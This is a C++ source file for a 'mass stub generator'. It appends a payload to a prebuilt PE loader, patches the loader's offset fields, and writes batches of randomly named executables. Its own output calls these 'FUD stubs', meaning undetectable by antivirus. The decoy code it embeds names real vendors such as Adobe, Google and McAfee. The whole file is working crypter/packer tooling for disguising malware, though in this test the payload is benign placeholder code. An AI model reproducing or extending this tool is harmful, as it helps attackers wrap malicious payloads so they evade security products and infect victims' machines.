#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <cstdint>
#include <random>
#include <chrono>
#include <thread>
#include "tiny_loader.h"

// Simplified mass stub generator for testing
class MassStubGenerator {
private:
    std::random_device rd;
    std::mt19937 gen;
    std::uniform_int_distribution<> dis;
    
public:
    MassStubGenerator() : gen(rd()), dis(0, 255) {}
    
    std::string generateRandomName(int length = 8) {
        const std::string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        std::string result;
        result.reserve(length);
        for (int i = 0; i < length; ++i) {
            result += charset[dis(gen) % charset.length()];
        }
        return result;
    }
    
    std::string generateBenignCode(const std::string& companyName) {
        std::vector<std::string> benignTemplates = {
            "#include <iostream>\n#include <string>\n\nint main() {\n    std::cout << \"Hello from " + companyName + "!\" << std::endl;\n    return 0;\n}",
            
            "#include <windows.h>\n\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n    MessageBoxA(NULL, \"Welcome to " + companyName + " application!\", \"Info\", MB_OK);\n    return 0;\n}",
            
            "#include <iostream>\n#include <ctime>\n\nint main() {\n    time_t now = time(0);\n    std::cout << \"Current time: \" << ctime(&now) << std::endl;\n    std::cout << \"" + companyName + " - System Information\" << std::endl;\n    return 0;\n}",
            
            "#include <iostream>\n#include <vector>\n\nint main() {\n    std::vector<int> numbers = {1, 2, 3, 4, 5};\n    std::cout << \"" + companyName + " - Processing data...\" << std::endl;\n    for (int num : numbers) {\n        std::cout << \"Processing: \" << num << std::endl;\n    }\n    return 0;\n}"
        };
        
        return benignTemplates[dis(gen) % benignTemplates.size()];
    }
    
    std::vector<uint8_t> generateMinimalPEExecutable(const std::string& payload) {
        try {
            // 1. Copy the pre-built loader into a vector
            std::vector<uint8_t> exe(tiny_loader_bin, tiny_loader_bin + tiny_loader_bin_len);
            
            // 2. Pad to next 0x200 boundary (PE file-alignment requirement)
            constexpr size_t kAlign = 0x200;
            size_t paddedSize = (exe.size() + kAlign - 1) & ~(kAlign - 1);
            exe.resize(paddedSize, 0);
            
            // 3. Append the payload
            size_t payloadOffset = exe.size();
            exe.insert(exe.end(), payload.begin(), payload.end());
            
            // 4. Patch two 32-bit placeholders inside the loader
            auto poke32 = [&](size_t off, uint32_t v) {
                if (off + 3 < exe.size()) {
                    exe[off+0] =  v        & 0xFF;
                    exe[off+1] = (v >>  8) & 0xFF;
                    exe[off+2] = (v >> 16) & 0xFF;
                    exe[off+3] = (v >> 24) & 0xFF;
                }
            };
            
            poke32(PAYLOAD_SIZE_OFFSET, static_cast<uint32_t>(payload.size()));
            poke32(PAYLOAD_RVA_OFFSET, static_cast<uint32_t>(payloadOffset));
            
            return exe;
            
        } catch (...) {
            return {};
        }
    }
    
    bool verifyPEHeader(const std::vector<uint8_t>& exe) {
        if (exe.size() < 2) return false;
        
        // Check MZ signature
        if (exe[0] != 0x4D || exe[1] != 0x5A) return false;
        
        // Check PE header - in tiny_loader.h, PE header is at offset 0x60 (96)
        if (exe.size() < 100) return false;
        
        // PE header should be at offset 0x60 in the tiny_loader_bin
        if (exe[96] != 0x50 || exe[97] != 0x45 || 
            exe[98] != 0x00 || exe[99] != 0x00) return false;
        
        return true;
    }
    
    void generateMassStubs(int count) {
        std::cout << "=== Mass Stub Generation Test ===\n\n";
        std::cout << "Generating " << count << " FUD stubs using tiny_loader.h...\n\n";
        
        std::vector<std::string> companyNames = {
            "Adobe Systems Incorporated",
            "Google LLC", 
            "Intel Corporation",
            "NVIDIA Corporation",
            "Apple Inc.",
            "Oracle Corporation",
            "IBM Corporation",
            "VMware, Inc.",
            "Symantec Corporation",
            "McAfee, Inc."
        };
        
        int successCount = 0;
        int failCount = 0;
        
        for (int i = 0; i < count; ++i) {
            std::cout << "Generating stub " << (i + 1) << "/" << count << "... ";
            
            // Generate random company and code
            std::string companyName = companyNames[dis(gen) % companyNames.size()];
            std::string benignCode = generateBenignCode(companyName);
            
            // Generate unique filename
            std::string outputPath = "mass_stub_" + std::to_string(i + 1) + "_" + generateRandomName(6) + ".exe";
            
            // Create PE executable
            std::vector<uint8_t> executableData = generateMinimalPEExecutable(benignCode);
            
            if (executableData.empty()) {
                std::cout << "❌ FAILED (empty data)\n";
                failCount++;
                continue;
            }
            
            if (!verifyPEHeader(executableData)) {
                std::cout << "❌ FAILED (invalid PE header)\n";
                failCount++;
                continue;
            }
            
            // Write to file
            std::ofstream outFile(outputPath, std::ios::binary);
            if (!outFile.is_open()) {
                std::cout << "❌ FAILED (cannot write file)\n";
                failCount++;
                continue;
            }
            
            outFile.write(reinterpret_cast<const char*>(executableData.data()), executableData.size());
            outFile.close();
            
            std::cout << "✅ SUCCESS (" << executableData.size() << " bytes)\n";
            successCount++;
            
            // Small delay to prevent system overload
            std::this_thread::sleep_for(std::chrono::milliseconds(50));
        }
        
        std::cout << "\n=== Generation Complete ===\n";
        std::cout << "✅ Successful: " << successCount << " stubs\n";
        std::cout << "❌ Failed: " << failCount << " stubs\n";
        std::cout << "📁 Files saved in current directory\n";
        std::cout << "🎉 Mass stub generation using tiny_loader.h is working!\n";
    }
};

int main() {
    MassStubGenerator generator;
    
    // Test with different counts
    std::vector<int> testCounts = {5, 10, 20};
    
    for (int count : testCounts) {
        std::cout << "\n" << std::string(50, '=') << "\n";
        generator.generateMassStubs(count);
        std::cout << std::string(50, '=') << "\n";
        
        if (count < testCounts.back()) {
            std::cout << "\nPress Enter to continue to next test...";
            std::cin.get();
        }
    }
    
    return 0;
}